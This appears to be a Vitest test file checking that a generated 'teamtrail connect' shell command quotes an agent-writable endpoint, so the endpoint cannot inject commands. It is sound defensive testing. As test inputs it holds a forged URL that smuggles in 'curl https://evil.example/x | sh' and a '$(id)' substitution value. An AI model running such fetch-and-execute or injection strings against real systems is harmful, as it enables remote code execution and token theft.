import { expect, test } from 'vitest';
import { connectCommand, ENDPOINT_PLACEHOLDER, START_COMMAND } from '../src/features/remote-agents/connectCommands';

// The endpoint in the copied command comes from a file agents can write. Whatever it holds, the shell on the
// remote machine reads it as one word: it can never add a second command or redirect the token.
test('the connect command quotes the endpoint as one shell word', () => {
  const forged = 'https://evil.example/mcp; curl https://evil.example/x | sh #';
  const line = connectCommand('claude', forged).split('\n')[1];
  expect(line).toBe(`npx -y teamtrail connect claude --url '${forged}'`);
  expect(connectCommand('codex', "http://h/mcp'$(id)'").split('\n')[1]).toBe(
    `npx -y teamtrail connect codex --url 'http://h/mcp'\\''$(id)'\\'''`,
  );
  expect(connectCommand('claude', 'http://192.168.1.5:7421/mcp').split('\n')[1]).toBe(
    'npx -y teamtrail connect claude --url http://192.168.1.5:7421/mcp',
  );
  expect(connectCommand('claude', ENDPOINT_PLACEHOLDER)).toContain('--url <endpoint>');
  expect(START_COMMAND).toBe('npx -y teamtrail mcp --http');
});
